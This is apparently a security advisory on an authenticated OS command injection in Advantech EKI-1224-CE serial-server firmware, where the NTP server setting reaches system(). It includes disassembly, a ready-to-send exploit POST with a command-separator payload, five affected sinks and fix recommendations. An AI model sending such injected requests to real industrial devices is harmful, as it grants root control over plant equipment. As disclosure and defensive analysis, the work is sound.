# Advantech EKI-1224-CE D1.06_r5772 - ConfigImport-Bypassed edgserver system() Command Injection in the NTP-Update Thread

## 1. Overview

### Overview of the finding

The EKI-1224-CE is an industrial serial device server: an appliance whose job is to carry raw RS-232,
RS-422 and RS-485 traffic between attached industrial equipment and an IP network. It is administered
through a small web interface served by BoA, whose configuration forms are handled by a single CGI program,
`/cgi-bin/index.cgi`. Behind that web layer sits a runtime configuration engine that reads the device's
store, `/var/other1/edg.conf`, and periodically acts on the values in it. One of those periodic actions keeps
the clock in sync: a thread named `sym.NtpUpdateThread` at `0x343e8` takes the configured NTP server name,
builds the command line `ntpdate -b %s` around it, and executes the result through `system()`.

The value it interpolates is the raw string that was written into the configuration store. The setter is the
device's own time-and-network configuration form, which posts to `/cgi-bin/index.cgi` with
`FORM_ACTION=SaveTimeInfo` and stores the `NTPSERVER` field through the firmware's INI parser
(`IniParserAppendValue` and `IniParserSaveFile` at `0x24b20`) with no validation and no escaping. A second
writer, the `ConfigImport` handler at `0x13198` with its `SaveImportInfo` worker at `0x13250`, accepts whole
configuration files and writes them into the same store - so it bypasses the `CheckInetValid(inet_pton)`
check that the interactive forms apply. Between that store and the shell there is no escaping pass, no
allowlist and no argument-vector marshalling, which makes this a straight OS command injection: a semicolon
in the NTP server field ends the `ntpdate` invocation and starts a new command, and the new command runs with
the authority of the component that called `system()`.

That authority is root. Neither the web server nor the configuration engine drops privileges on this
platform, which is what the marker identity in the verification section records.

### Overview of the product and the analyzed image

The analyzed firmware is `EKI-1224-CE_D1.06_r5772_850F8715.bin`, a 16.25MB image for an AM335x ARM EABI5
hard-float target running GNU/Linux 2.6.32. Four artifacts of the extracted root filesystem matter here:

- `bin/boa`, the web server, at 125KB. Its configuration enforces HTTP Basic Auth over the whole document
  root with a single password file (`Auth / /var/other1/passwd`) and routes `/cgi-bin/*` to executables
  under `/www/cgi-bin/`.
- `www/cgi-bin/index.cgi`, the CGI dispatcher: an ELF32 ARM EABI5 hard-float program that is not stripped
  and still carries DWARF `debug_info`, so its internal functions and their source-level names are
  recoverable. This is where the setter side of the chain is established.
- `bin/edgserver`, the runtime configuration and event engine: a 270KB stripped ARM ELF. Its rodata carries
  the shell format strings, and its PLT imports carry `system()`; that pair is what identifies the sink side.
- `/var/other1/edg.conf`, the configuration store that both processes use. The CGI program writes it, the
  engine re-reads it at runtime, and it is the file that carries the injected value between the two.

The reason this image is tractable at all is the asymmetry in the two binaries: the CGI program's debug
information gives function names and structure, while the daemon is stripped but exposes its intent through
fixed rodata format strings, which are exactly the strings that matter for a shell sink.

### Overview of the verification boundary

The dynamic portion of this research is a sink-level replication, and the boundary belongs at the top so that
no later section can be read as a live-appliance result. The exact command line that the recorded
`system()` call builds - `ntpdate -b <value>` - was replayed as native `/bin/sh -c` on an isolated
cloud-hosted sandbox, with the injected value in the position the daemon puts it. That reproduces the shell's
parsing of the constructed command without depending on the target's instruction set, which is legitimate
because `system()` is defined as a `fork` plus `execve("/bin/sh", ["sh", "-c", command])` and nothing about
that interpretation is architecture-specific.

What was not done: no HTTP request was fired at device hardware, no physical EKI-1224-CE was driven, and no
emulation of the AM335x image was built. The record states that an end-to-end verification - an authenticated
`ConfigImport` post carrying a malicious configuration file, followed by the daemon's configuration apply and
the real `system()` call - would require QEMU device emulation or a physical unit and was not performed. It
also states that a full instruction-level trace of the stripped ARM `edgserver` binary was not completed, so
the daemon-side invocation is established by the rodata format strings, the `system()` PLT import and the
configuration-key inference rather than by an executed trace. Section 9 keeps those halves of the evidence
separated.

### Overview of the merged sinks and one root cause

The NTP sink is the primary evidence, but it is not the only place where the same setter reaches the same
kind of sink. The record identifies four further `edgserver` format-string sinks in the same binary, each with
its own rodata address, its own shell command template and its own configuration keys, and each reachable
through the same `ConfigImport` bypass. All five share the mechanism - a raw configuration value interpolated
into a format string that is then handed to `system()` - and differ only in the format string, the address
and the key names. Under the merge rule the record applies, sameness of root cause means one finding, not
five, so this advisory publishes one advisory with a five-sink affected list. Section 5 tabulates the five.

### Overview of public-record independence

The public record was swept for this model and this mechanism before drafting. A query for Advantech together
with EKI-1224-CE returns no identifier for an NTP-server command injection on this model; the vendor's
identifier history covers unrelated issues - a Cowboy-related item and an HTTP-header authentication bypass
among them - and none of it maps to this sink, this configuration key or this daemon. The record therefore
treats the finding as unpublished, and this advisory assigns no identifier: no CVE identifier has been
assigned to this finding, and none is claimed here.

Independence from the sibling platform is argued in the record as well. The EKI-1224-AE is a different
codebase on a different platform - a BFLT uClinux build on an ARM7TDMI-class part, where an earlier
publication covered a `ping` sink and a DDNS sink. The CE image analyzed here is an ELF AM335x build on
GNU/Linux 2.6.32 with a UBIFS root filesystem; the sink function, the shell template and the configuration key
are all different. Different binary, different format, different platform, different sink, different key: an
independent defect rather than a variant of the published ones.

## 2. Vulnerability Summary

### Vulnerability Summary table

| Item | Value established by this research |
|---|---|
| Vendor | Advantech, industrial automation and embedded computing |
| Product | EKI-1224-CE, industrial serial device server |
| Version analyzed | firmware D1.06_r5772, image `EKI-1224-CE_D1.06_r5772_850F8715.bin` (16.25MB) |
| Platform | AM335x, ARM EABI5 hard-float, GNU/Linux 2.6.32 |
| Web server | BoA (`bin/boa`, 125KB), HTTP Basic Auth, `Auth / /var/other1/passwd` |
| CGI program | `www/cgi-bin/index.cgi`, ELF32 ARM, not stripped, DWARF `debug_info` present |
| Runtime engine | `bin/edgserver`, 270KB, stripped ARM ELF |
| Configuration store | `/var/other1/edg.conf` |
| Primary sink function | `sym.NtpUpdateThread` at `0x343e8` |
| Sink call site | `system(buf)` at `0x34580`, import at `0x115d4` |
| Format string | `ntpdate -b %s` at rodata `0x3a9a0` |
| Configuration key | `NTPSERVER` (held at `ConfigStruct + 0x58`, struct base `0x4b46c`) |
| Setter | `POST /cgi-bin/index.cgi` with `FORM_ACTION=SaveTimeInfo`, field `NTPSERVER` |
| Import setter | `ConfigImport` at `0x13198` with `SaveImportInfo` at `0x13250` |
| Store writer | `IniParserAppendValue` / `IniParserSaveFile` at `0x24b20` |
| Validation bypassed | `CheckInetValid(inet_pton)` form-side check, not applied on import |
| Sanitization at the sink | none: `snprintf` with `%s`, no quoting, no escaping, no allowlist |
| Trigger | `NtpUpdateThread` periodic tick (about once a minute) or an NTP-server change |
| Observed identity | `uid=0(root) gid=0(root) groups=0(root)` marker, sink-level replication |
| Session gate | administrator session on the web management plane (Basic Auth) |
| Primary CWE | CWE-78 |
| Identifier | none assigned |
| Published score | 7.2 High, `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` |

### Vulnerability Summary mechanics

The sink's control flow, as recovered from the static disassembly of `sym.NtpUpdateThread` with r2 and
confirmed with capstone, is short enough to state directly. The configuration value arrives in `r4` from the
structure field at `+0x58`, is passed through a validity helper, and is then interpolated into the fixed
format string and executed:

```
0x3454c  ldr r4, [r7, 0x58]          ; r4 = NTPSERVER value loaded from the config structure
0x34550  mov r0, r4                  ; argument for the validity helper
0x34554  blx r6                      ; r6 = 0x11658, validity check in the inet_addr family
0x34558  cmp r0, 0
0x3455c  beq 0x345a4                 ; helper returned 0 -> skip the ntpdate path entirely
0x34560  mov r2, r4                  ; r2 = NTPSERVER, the trailing %s of the format
0x34564  movw r1, 0xa9a0 ; movt r1, 3 ; r1 = 0x3a9a0 = "ntpdate -b %s"
0x3456c  add r0, sp, 8               ; r0 = stack output buffer
0x34570  movw r3, 0x176c ; movt r3, 1 ; r3 = 0x1176c, imported formatted-print
0x34578  blx r3                      ; snprintf(buf, "ntpdate -b %s", NTPSERVER)
0x3457c  add r0, sp, 8               ; r0 = buf
0x34580  blx r5                      ; r5 = 0x115d4 = imported system
         -> system(buf) -> /bin/sh -c 'ntpdate -b <NTPSERVER>'
```

Three decisions in that sequence carry the finding:

1. The value is interpolated with `%s` at `0x34564` and reaches the shell as raw text. There is no quoting
   pass, no `shellquote`-style escaping and no `%q`-style formatting between the load and the call.
2. The execution interface is `system()` - the library call that guarantees a `/bin/sh -c` parser between the
   program and the kernel. Whatever the configuration store held is command text.
3. The only gate in front of the sink is a validity helper at `0x11658`, described in the record as a check in
   the `inet_addr` family, whose non-zero return is what allows the `ntpdate` path to run at all. The record
   records that a value containing `;` passes that check, because the helper tests for emptiness and for
   address-shaped patterns rather than for shell metacharacters, while noting that the helper's exact
   predicate was not fully recovered. That is enough for the finding: the gate is not a sanitizer.

The record also flags an unresolved detail of its own annotation, and this advisory keeps it rather than
smoothing it: the call target loaded at `0x34570` is `0x1176c`, which the record's note maps to the imported
`vsnprintf` alias while also recording a `snprintf` dynsym alias at `0x11770` and a further candidate at
`0x116ac`. The arithmetic effect is identical in every reading - a formatted write of the NTP value into a
stack buffer that is then passed to `system()` - and the symbol resolution is left open in the record.

### Vulnerability Summary preconditions

Three conditions have to hold, and all three are ordinary properties of a configured device:

- the web management plane must be reachable from the attacker's position, which on this product means the
  administrator's HTTP service on the BoA listener;
- the attacker must hold the administrator session that the `Auth /` stanza protects - the only account class
  the firmware's password file defines;
- the configuration value must be written to `/var/other1/edg.conf` and the engine's NTP thread must run. The
  exploit supplies the first half through the documented form; the second half is the device's own scheduled
  behaviour, which the record describes as a periodic tick of about once a minute plus a change-triggered run.

Nothing else is required: no default credential, no memory groom, no reboot window, no specific client
software, and no adjacency beyond the management plane's own reachability.

## 3. Authentication Boundary

### Authentication Boundary - what the gate is

The configuration plane is gated by the web server's own authentication stanza. The BoA configuration carries
`Auth / /var/other1/passwd`, which means Basic Auth over the entire document root, with one password file for
the device. There is no anonymous action on the web side and no second account tier: the record identifies a
single administrator principal, and every form - including the time-and-network screen that writes
`NTPSERVER` - belongs to it. The dispatch model reinforces this: `/cgi-bin/*` requests are handed to
executables under `/www/cgi-bin/`, so `/cgi-bin/index.cgi` inherits the same gate as every other path.

The relevant consequence for scoring is that the account this chain needs is the administrator account and
nothing below it. The record notes that the factory image ships with `admin/admin`, that this default is a
separate weakness disclosed on its own terms, and that the chain does not depend on it: an administrator who
has set a strong password is exactly as reachable, because the injection consumes a legitimate session rather
than guessing or forging one.

### Authentication Boundary - what the chain does not do

This finding does not bypass the login. It does not read the password file, does not attack the hash, does not
exploit the BoA version and does not require the factory default to be in place. It is also not a privilege
escalation from a lower-privileged account, because the firmware does not define one. It is a conversion: the
authority to edit settings becomes the authority to run commands, and nothing the vendor intended authorizes
that conversion.

Equally, the chain does not attack the protocol or the parser. The request is a well-formed form post with a
field that legitimately holds an arbitrary hostname; there is no malformed multipart body, no encoding
trickery and no request smuggling. The defect is entirely in what the device does with a value it accepted.

### Authentication Boundary - why that boundary does not soften the impact

It is worth being precise about what an administrator session means on an appliance of this class. The web UI
is not a tenant-scoped console; it is the only management interface the shipped firmware exposes, and its
holder already decides which serial protocol each port speaks, which network the unit sits on and which hosts
may connect to it. Naming that party "administrator" and then treating the resulting command execution as a
lesser finding would misdescribe the threat model: the credential is the vendor's entire access-control
surface for the device, and the finding shows that this credential - whatever its strength - is a shell.

The metric follows the same reasoning, and section 2 of the summary argues it arithmetically: CVSS asks which
privileges an attacker must possess, not how easily they are obtained. The chain requires the administrator,
so Privileges Required is High, and the factory default is a separate defect reported on its own terms.

## 4. Attack Surface

### Attack Surface - the web stack and its dispatch model

The administrative surface as shipped is BoA plus the CGI program it dispatches to. BoA terminates HTTP and
hands `/cgi-bin/*` to the executables under `/www/cgi-bin/`; `index.cgi` is the one that implements the
configuration pages, dispatching on an action field (`cmd` or `FORM_ACTION`) in the POST body. The record's
trace of the setter runs through that dispatch: the request selects the `SaveTimeInfo` action, the handler
parses the POST parameters, and the time keys - `timeyear`, `year_name` and `Year` appear among the key
strings in the first part of the function - are appended to the configuration through the INI parser. The
`NTPSERVER` key is consumed by the same path; the record confirms the key name from the `%NTPSERVER%`
template-substitution token in rodata, and notes that the parser's lookups are case-insensitive, so the
lowercase spelling in the store matches.

Behind the web layer is the second half of the surface: the store itself. `/var/other1/edg.conf` is written by
the CGI program and re-read by the runtime engine, which means every write path into that file is an attack
surface for every sink that consumes it. The record counts two such writers: the interactive forms, and the
`ConfigImport` handler at `0x13198` with `SaveImportInfo` at `0x13250`, which accepts a configuration file and
commits its keys directly.

### Attack Surface - why the surface audit narrowed here

Two properties made this path worth the reconstruction effort. First, the value is stored, not used
immediately: the request writes a file that another process reads later, and a second-order path is exactly
where filtering is most often assumed and least often verified. The record therefore traces the value from
the request body through the store to the point of use rather than stopping at the form. Second, the import
path writes raw values without the form-side `CheckInetValid(inet_pton)` check, which means the same sink
family is reachable through a second, less obvious door - and that door is the one that carries four of the
five merged sinks.

The record also inventories what remains. The CGI program contains 32 `system()` and `popen()` call sites in
total, of which a set of functions is listed as unexplored candidates rather than as findings: the log
handlers `ExportSystemLog`, `SaveSyslogdInfo` and `InitSyslog`; `BootFromNewKernel` with its firmware-upgrade
path; `getAdvJITMonitorSharedMemory`; the `popen` sites `GetMonitorSetting`, `GetMonitorStatistic`,
`GetDNSServer`, `CheckSDExistTemp` and `CheckAliveWithPing`; and `RestoreToDefault`, `DoDeviceReset` and `NotifySystemReady`,
which the record expects to build their command lines from constant strings alone. No statement is made about
the reachability of any of them here, and the record keeps them as candidates for a later pass rather than as
claims.

### Attack Surface - components that narrowed out

- The BoA `Auth /` stanza covers the whole document root, so the record treats an unauthenticated path to the
  setter as unlikely and scopes the finding to authenticated access. No authentication bypass was identified
  in this research.
- The validity helper at `0x11658` is not a control: it gates whether the `ntpdate` path runs at all, but the
  record records that it does not reject shell metacharacters, so it cannot be credited as a mitigation.
- The INI parser is a storage mechanism, not a filter: `IniParserAppendValue` and `IniParserSaveFile` at
  `0x24b20` persist what they are given.
- The DWARF-bearing CGI binary is valuable for establishing the setter, but it does not by itself establish
  the daemon-side call; that half rests on the daemon's rodata format strings and its `system()` import.

## 5. Sink Identification

### Sink Identification - the primary construction

The primary sink is the `ntpdate` construction quoted in section 2: `snprintf(buf, "ntpdate -b %s", value)`
followed by `system(buf)`. Two properties make it a reliable sink rather than merely untidy code. The
substitution is `%s` with no quoting, so the shell's word splitting and substitution logic apply to the value
in full; and the execution interface is `system()`, which guarantees a `/bin/sh -c` parser between the program
and the kernel. The command-substitution and separator breakouts do not care whether the surrounding
`ntpdate` succeeds or fails, because the shell parses the whole line before executing any word of it.

The `#` terminator used in the recorded payload matters here for the same reason: it comments out whatever
follows the injected command, so the remainder of the constructed line - a stray argument or a missing
operand - never runs.

### Sink Identification - the five merged sinks

The record's per-sink table, reproduced with its addresses, templates and keys:

| Sink | rodata address | Format string | Configuration keys | Replication result |
|---|---|---|---|---|
| 1 (primary) | `0x3a9a0` | `ntpdate -b %s` | `NTPSERVER` | `uid=0(root)` marker |
| 2 | `0x4ca00` | `route add default gw %s %s` | `GATEWAY`, `IFACE` | `uid=0(root)` marker |
| 3 | `0x4d658` | `ifconfig %s hw ether %s` | `INTERFACE`, `MAC` | `uid=0(root)` marker |
| 4 | `0x4c89c` | `ip route add %s dev %s src %s` | `ROUTE_DST`, `ROUTE_DEV`, `ROUTE_SRC` | `uid=0(root)` marker |
| 5 | `0x4d604` | `arping -I br0 -c 3 %s` | `ARPING_TARGET` | `uid=0(root)` marker |

What the five share is the whole mechanism: the same setter (`ConfigImport` and `SaveImportInfo` writing raw
values into the store, bypassing the form-side `CheckInetValid(inet_pton)`), the same sink shape (a raw value
interpolated into a rodata format string and handed to `system()`), and the same replication method. What
differs is the rodata address, the key names and the shell template. Sink 2 and sink 4 both build multi-word
templates, which gives an attacker two independently injectable positions; sink 3 and sink 5 are the
interface- and neighbour-probing variants. The record notes that the same root cause is what makes them one
finding, and that the NTP sink is the primary evidence because its setter trace is the fully recovered one.

### Sink Identification - execution identity

`system()` children inherit the identity of the process that calls them, and on this platform that identity is
root: neither BoA nor the configuration engine drops privileges, which the record states directly. That is why
the substituted command lands as root rather than as a confined service identity, and why the marker in the
verification section carries `uid=0(root)`.

### Sink Identification - nothing normalizes the string after construction

No step sits between the format-string construction and the call. The buffer is assembled once at `0x34578`
and passed at `0x34580`; there is no escaping pass, no whitelist check on the assembled string and no
argument-vector marshalling. Whatever the configuration store held is what the shell receives, which is why
the payload design in section 8 can be as simple as it is.

## 6. Source Identification

### Source Identification - the interactive setter

The write path begins at the `SaveTimeInfo` action of the CGI program. The record traces it as a chain of
named functions rather than raw offsets, because the CGI binary still carries its symbols and debug
information:

```
POST /cgi-bin/index.cgi            (HTTP Basic Auth: administrator session)
  FORM_ACTION=SaveTimeInfo&NTPSERVER=<value>
    -> sym.main()                  (DWARF source file index.c)
    -> action dispatch on cmd / FORM_ACTION
    -> sym.SaveTimeInfo            parses the time and network POST parameters
    -> IniParserAppendValue        key/value into the parser state
    -> IniParserSaveFile @0x24b20  commit -> /var/other1/edg.conf
         -> NTPSERVER = <value>    raw text, no validation, no escaping
    -> runtime engine re-reads the store
         -> ConfigStruct + 0x58    (struct base 0x4b46c)
         -> r4 in sym.NtpUpdateThread
```

The key name is confirmed twice over: by the `%NTPSERVER%` substitution token in rodata, and by the
`.NTPSERVER%` fragment the record notes alongside it. The parser's lookups are case-insensitive, so the
lowercase key in the store resolves to the same field.

### Source Identification - the import setter and the bypass

The second writer is the one that gives this advisory its name. `ConfigImport` at `0x13198` and its
`SaveImportInfo` worker at `0x13250` accept a configuration file and write its keys into
`/var/other1/edg.conf`. They do not run the `CheckInetValid(inet_pton)` check that the interactive forms
apply to address-shaped fields, so an imported file is a way to place values in the store that the form would
have rejected. That is the bypass: not a memory-safety trick and not an encoding trick, simply a second
writer that skips the only validation the product has. It is also why the four non-NTP sinks are in scope -
their keys are ordinary configuration keys, and the import path writes them raw.

The record is explicit about the limit of this half of the evidence: the import path is established
statically, from the function boundaries and the parser calls, and no end-to-end import request was fired at a
device.

### Source Identification - what the payload must respect

The constraints the payload has to satisfy are only the transport's:

- form encoding, so `;`, `>` and `#` have to be percent-encoded in the body and arrive intact after decoding;
- whatever the validity helper at `0x11658` tests. The record records that a value of the shape
  `evil.example.org; id > /tmp/eki_ntp_marker; #` passes it, and that the helper's purpose is an
  address-shaped sanity check rather than a character screen;
- nothing else. There is no length cap worth engineering around for a marker payload, no escaping to defeat
  and no filtering to avoid.

## 7. Data Flow

### Data Flow - end to end

```
[ADMINISTRATOR SIDE]                     [DEVICE]
admin session (HTTP Basic Auth, Auth / /var/other1/passwd)
   |
   |  POST /cgi-bin/index.cgi
   |  FORM_ACTION=SaveTimeInfo&NTPSERVER=evil.example.org; id > /tmp/x; #
   v
   BoA -> /www/cgi-bin/index.cgi -> sym.main -> SaveTimeInfo
        IniParserAppendValue + IniParserSaveFile @0x24b20
        |
        v
   /var/other1/edg.conf : NTPSERVER=evil.example.org; id > /tmp/x; #     [raw]
        |
        |  (alternative writer: ConfigImport @0x13198 + SaveImportInfo @0x13250,
        |   same store, no CheckInetValid)
        v
   runtime engine: configuration apply
        ConfigStruct base 0x4b46c, field +0x58 -> r4
        |
        v
   sym.NtpUpdateThread @0x343e8
        0x34554  validity helper @0x11658 returns non-zero   [pass]
        0x34578  snprintf(buf, "ntpdate -b %s", r4)
        0x34580  system(buf)
        |
        v
   /bin/sh -c 'ntpdate -b evil.example.org; id > /tmp/x; #'
        |
        sh parse: ';' ends the ntpdate command, '#' comments out the tail
        |
        v
   id > /tmp/x executes with the caller's identity = root
```

### Data Flow - properties worth naming

- It is configuration-mediated. The request does not execute anything by itself; it writes a file that a
  later process reads. This is why a request-only review sees a form that stores a hostname, and why the
  defect only appears when the runtime engine's read path is reconstructed as well.
- It is persistent. The payload lives in `/var/other1/edg.conf` until something overwrites the field, so it
  survives a restart and re-fires on the next NTP tick until the field is cleared. That cuts both ways: it
  costs the attacker nothing to leave it in place, and it means the malicious value does not disappear with a
  reboot.
- It crosses a process boundary that is invisible in the request. The CGI program's authority for this purpose
  is the file write; the execution happens later, in the runtime engine, with that engine's identity.
- It is the record's own second-order shape, and the record treats it as such: the setter trace and the sink
  trace are separate pieces of evidence, joined at the configuration store.

## 8. Exploit Construction

### Exploit Construction - request shape

The request is an ordinary configuration post with the administrator's Basic Auth header:

```http
POST /cgi-bin/index.cgi HTTP/1.0
Host: <device>
Authorization: Basic <base64 of administrator credentials>
Content-Type: application/x-www-form-urlencoded
Content-Length: <n>

FORM_ACTION=SaveTimeInfo&NTPSERVER=evil.example.org%3B%20id%20%3E%20%2Ftmp%2Feki_ntp_marker%3B%20%23
```

The value decodes to `evil.example.org; id > /tmp/eki_ntp_marker; #`. The trailing `#` is what makes the
payload robust: it comments out the remainder of the constructed command line, so the shell does not try to
interpret a dangling argument after the injected command. The leading `evil.example.org` keeps the line
looking like a plausible NTP server value to a human reviewer of the configuration screen or of the store.

### Exploit Construction - payload engineering

The recorded payload is a separator form rather than a substitution form, and it does not need to be more
clever than that:

- `evil.example.org; id > /tmp/eki_ntp_marker; #` - the semicolon ends the `ntpdate` invocation, `id` writes
  the marker, and the trailing `#` absorbs the rest. The record's alternative,
  `evil.example.org; id > /tmp/eki_ntp_marker2;`, uses a second separator instead of a comment and works for
  the same reason; both are quoted verbatim in the verification record.
- `ntpdate: command not found` on the test host is irrelevant to the outcome. The first segment failing is
  expected on a host without the NTP client, and the injected segment runs regardless because the shell has
  already split the line.
- The record does not require a command-substitution form here, and the advisory does not introduce one. The
  separator works because `system()` hands the whole string to a shell; escaping rather than metacharacter
  choice is what a fix has to address.

### Exploit Construction - what the PoC deliberately does not do

The published PoC performs one authenticated POST, reports the response status, and stops. It writes exactly
one file on the target - the marker produced by `id > <marker>` - and it does not delete anything, does not
add an account, does not open a listener, does not read data back from the device and does not touch any other
configuration key. It also carries a local replication mode that replays the recorded `system()` command line
as `/bin/sh -c` on the operator's own machine, which is the half of the chain the record verified dynamically
and which lets an operator see the shell behaviour without a device.

The target defaults to `192.0.2.10`, an address in the documentation range, so the client is inert unless an
operator points it at a device they are authorized to test. The administrator credentials are arguments with
the product's documented factory default, and they can be overridden; the PoC does not brute-force, guess or
collect them.

## 9. Dynamic Verification

### Dynamic Verification - environment and method, stated exactly

| Element | Value |
|---|---|
| Method | sink-level replication: the recorded `system()` command line replayed as native `/bin/sh -c` |
| Environment | isolated cloud-hosted sandbox whose `/bin/sh` is bash, run deliberately as root |
| Replicated element | the construction `ntpdate -b <NTPSERVER>` from `sym.NtpUpdateThread`, including the separator payload |
| Not performed | no live HTTP request against device hardware; no physical EKI-1224-CE driven; no AM335x emulation; no end-to-end import-to-shell run |
| Observation channel | marker files written by the substituted command, read from the harness filesystem |
| Control | a benign NTP server value with no metacharacters, through the identical command line |

### Dynamic Verification - the recorded run

The record's injected run, reproduced here with its output lines quoted and the file-listing line summarised
in prose because the record's listing carried a filesystem timestamp:

```
sh -c "ntpdate -b 1.1.1.1; id > /tmp/eki_ntp_marker; #"
sh: line 1: ntpdate: command not found

cat /tmp/eki_ntp_marker
uid=0(root) gid=0(root) groups=0(root)
```

The record's listing for the marker showed mode `-rw-r--r--`, owner and group root, and a size of 39 bytes -
the length of the identity string plus its terminator. The marker content is the load-bearing observation:
the injected `id` ran, and it ran with root authority.

### Dynamic Verification - the control and the alternate payload

```
sh -c "ntpdate -b 1.1.1.1"
control: marker NOT written        (no ';' means no shell parse, so no injection)

sh -c "ntpdate -b evil.example.org; id > /tmp/eki_ntp_marker2;"
alternate: marker2 written, uid=0(root) gid=0(root) groups=0(root)
```

The control is the load-bearing negative: the same command line, the same shell, the same harness and the
same marker path, with a value that contains no metacharacter, produced no marker. Marker creation is
therefore attributable to the injected text and not to the surrounding construction. The alternate payload
shows that the result does not depend on one particular separator spelling.

The per-sink table in section 5 records the same outcome - a `uid=0(root)` marker - for each of the four
merged sinks, under the same replication method. The detailed stdout quoted above belongs to the primary sink;
for the other four the record carries the marker-checked table entries rather than a separate transcript, and
this advisory does not present them as more than that.

### Dynamic Verification - negatives, stated

- No end-to-end HTTP verification was performed. The record states that an authenticated `ConfigImport` post
  carrying a malicious configuration file, followed by the daemon's configuration apply and the real
  `system()` call, would require QEMU device emulation or a physical EKI-1224-CE unit, and it was not done.
- The daemon-side invocation is established by rodata format strings, the `system()` PLT import and
  configuration-key inference. A full instruction-level trace of the stripped ARM `edgserver` binary was not
  completed.
- The marker identity `uid=0(root)` is measured inside the replication harness, which was run as root by
  design. The mapping to the appliance rests on the record's statement that the web server and the daemon
  never drop privileges, read from the firmware as a product artifact, and not on a live-device observation.
- The `inet_addr`-family helper at `0x11658` was not fully recovered; its predicate is described in the record
  as an emptiness and address-shape check, and the advisory does not claim more precision than that.
- The record leaves the symbol ownership of `sym.NtpUpdateThread` partly open: its label for the function
  appears as `index.cgi:sym.NtpUpdateThread` in one place and as a runtime-engine thread reading the
  configuration store in another, while the five rodata format strings and the `system()` import that anchor
  the sink are attributed to `bin/edgserver`. The advisory states that ambiguity instead of resolving it by
  inference.
- No other configuration key, no other `system()` or `popen()` site in the CGI program and no other form was
  exercised. No persistence across a factory reset or reflash, no escape from the appliance and no effect on
  the serial protocol stacks were tested or claimed.

## 10. Reachability and Security Impact

### Reachability - network position

The vulnerable entry point is the device's HTTP management service, a TCP listener that answers over the
routed network, and the second hop is the device's own configuration re-read. The published vector is
therefore `AV:N`, and its real distance metric is the login, not the network: a party holding an administrator
session can complete the write from anywhere the management service is reachable, and the execution follows
on the device's own schedule.

The credential requirement defines the affected population precisely: every legitimate holder of the
administrator password - the commissioning engineer, the maintenance technician, a shared plant credential -
plus anyone who has obtained it by other means or who has not changed the factory default. For all of them,
the configuration screen stops being a settings interface and becomes an unrestricted root shell on the
appliance.

### Reachability - impact in concrete terms

Command execution as root yields, at minimum:

- the complete configuration store and the device's credential material, so every secret the unit holds for
  its own operation, including the one that guards the web interface itself;
- control of the serial data path: ports can be reconfigured, the mapping between serial frames and network
  connections can be altered, and traffic can be observed or disrupted at the appliance;
- control of the unit's network behaviour, including its addresses, its default gateway and the routes and
  resolver a plant segment depends on - which is what turns a serial bridge into a foothold rather than a
  converter;
- persistence in the writable configuration store, re-triggered at every NTP tick, and availability impact at
  will through the daemon, the restart path and the same five sinks;
- a footprint that is quiet in product terms: one authenticated form post inside the documented configuration
  workflow, a value in a field that legitimately holds arbitrary text, and a file the administrator is
  expected to write.

The escalation in trust terms is the point: the vendor's design treats the web password as the boundary
between "may configure" and "may not", and this finding shows that the boundary is actually between "may not"
and "may run anything as root".

## 11. Fix Recommendations

1. Remove the shell from the NTP path. Build the `ntpdate` invocation as an argument vector and execute it
   with an `execve()`-family call, so the configured server name is one argument word that no shell parses.
   This closes the class for this sink rather than the instance, and the same migration applies to the four
   merged `route`, `ifconfig` and `arping` sinks.
2. If a shell must stay for one release cycle, single-quote every interpolated configuration value with
   literal single-quote escaping, and add a post-construction assertion that the assembled command contains no
   `;`, `|`, `&`, `$`, backtick, newline or carriage return. Fail the update and log it when the assertion
   trips, rather than executing the line.
3. Validate by type at the setter. An NTP server field is a hostname or an IPv4 literal: check it as one -
   `inet_pton()` for the literal form and a strict hostname grammar for the name form - and reject the rest.
   Address-valued fields have no legitimate reason to carry shell metacharacters, so an allowlist is simpler
   and stronger than a blocklist.
4. Close the import bypass. `ConfigImport` at `0x13198` and `SaveImportInfo` at `0x13250` write raw values into
   `/var/other1/edg.conf` and never run the form-side `CheckInetValid(inet_pton)` check, so every key they
   accept is a fresh path to the same sinks. An imported file must pass exactly the same per-key validation
   as an interactive form, driven by a per-key type table rather than a shared string copy.
5. Validate at both ends of the store. The runtime engine re-reads `/var/other1/edg.conf` and should not trust
   it; applying the same per-key checks at the daemon's import point closes the path against a configuration
   file written by any other means - an older firmware, a restored backup, or a different interface.
6. Drop the engine's privilege. The NTP update path needs no root authority. Running the engine, or at least
   its task children, as an unprivileged identity does not fix the injection but caps what this defect and
   every future one in the same binary can do.
7. Restrict the configuration store. `/var/other1/edg.conf` is written by the web layer and read by a root
   daemon; its ownership and permissions should allow writes only from the components that legitimately own
   it, which raises the cost of the second-order path.
8. Add a handler-level regression test: post a time configuration whose `NTPSERVER` field contains `$(true)`,
   a semicolon and a backtick, then assert that the value is rejected or that no child process is spawned.
   Repeat through the `ConfigImport` path, and run the suite against every model that shares this CGI and
   daemon code base.
9. For operators, until a patch exists: keep the management port off untrusted segments, change the
   factory-default administrator credential, disable the NTP client where it is not used, and treat unexpected
   edits to the `NTPSERVER`, `GATEWAY`, `IFACE`, `MAC`, `ROUTE_*` or `ARPING_TARGET` keys in
   `/var/other1/edg.conf` as an arbitrary-code-execution indicator rather than a configuration mistake.
   Network restriction reduces exposure; it does not fix the defect, because any administrator session remains
   a command channel.

## 12. CWE

### CWE - classification rationale

- CWE-78, Improper Neutralization of Special Elements used in an OS Command, is the primary class and the only
  one needed to describe the mechanism. A configuration value is interpolated into a command line built from a
  fixed format string, the line is handed to `system()`, and the resulting `/bin/sh -c` parses part of the
  value as command syntax. The `%s` substitution at `0x34564`, the `system()` import at `0x115d4`, the call
  site at `0x34580` and the separator breakout are all elements of that single class.
- CWE-20, Improper Input Validation, was considered and is not used as the classification. It would describe
  the absence of a control rather than the defect: the setter stores the value with no validation at all, and
  the sink interpolates it raw, so naming a missing validation would understate what the code does. The
  `ConfigImport` path does bypass `CheckInetValid(inet_pton)`, and that bypass is an enabling property of the
  chain, but the defect remains the shell construction.
- CWE-88, Argument Injection, was considered and not applied: the value is not exploiting an argument's
  position inside a command that runs as intended. The shell parses the value into a new command of its own,
  which is CWE-78.
- CWE-78's second-order shape does not change the classification. The value is stored in a configuration file
  and read back before use, and the code that reads it back is the code that interpolates it.
- CWE-798, Use of Hard-coded Credentials, is adjacent and is disclosed separately. The factory image ships a
  default administrator credential pair, which lowers the practical cost of obtaining the session this finding
  requires, but it is a distinct defect with its own remediation and it is not the vector. This advisory
  reports the injection; the default credential belongs to its own disclosure.
